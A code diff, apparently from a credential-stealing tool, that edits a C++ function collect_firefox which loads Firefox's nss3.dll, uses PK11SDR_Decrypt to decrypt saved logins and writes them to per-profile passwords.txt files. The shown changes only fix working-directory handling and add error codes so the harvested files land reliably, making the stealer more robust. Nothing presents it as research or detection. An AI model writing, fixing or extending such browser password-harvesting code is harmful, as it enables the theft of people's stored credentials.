@@ -434,8 +434,7 @@ void collect_firefox(const BrowserConfig& browser) {
     NSSShutdown_t f_NSS_Shutdown = nullptr;
     PK11SDRDecrypt_t f_PK11SDR_Decrypt = nullptr;
 
-    wchar_t original_cwd[MAX_PATH];
-    GetCurrentDirectoryW(MAX_PATH, original_cwd);
+    fs::path original_cwd_fs = fs::current_path();
     SetCurrentDirectoryW(bin_dir.c_str());
 
     h_nss = LoadLibraryW(L"nss3.dll");
@@ -587,14 +586,16 @@ void collect_firefox(const BrowserConfig& browser) {
         }
 
         // Save Firefox reports
-        fs::path browser_dir(browser.name);
-        fs::create_directories(browser_dir);
+        std::error_code ec_dir;
+        fs::path browser_dir = original_cwd_fs / browser.name;
+        fs::create_directories(browser_dir, ec_dir);
+
         std::string p_name_sanit = profile_name;
         std::replace(p_name_sanit.begin(), p_name_sanit.end(), '/', '_');
         std::replace(p_name_sanit.begin(), p_name_sanit.end(), '\\', '_');
         std::replace(p_name_sanit.begin(), p_name_sanit.end(), ':', '_');
         fs::path profile_dir = browser_dir / p_name_sanit;
-        fs::create_directories(profile_dir);
+        fs::create_directories(profile_dir, ec_dir);
 
         try {
             std::ofstream pass_file(profile_dir / "passwords.txt");
@@ -657,7 +658,7 @@ void collect_firefox(const BrowserConfig& browser) {
     }
 
     if (h_nss) FreeLibrary(h_nss);
-    SetCurrentDirectoryW(original_cwd);
+    SetCurrentDirectoryW(original_cwd_fs.c_str());
     fs::remove_all(temp_dir);
 }
 
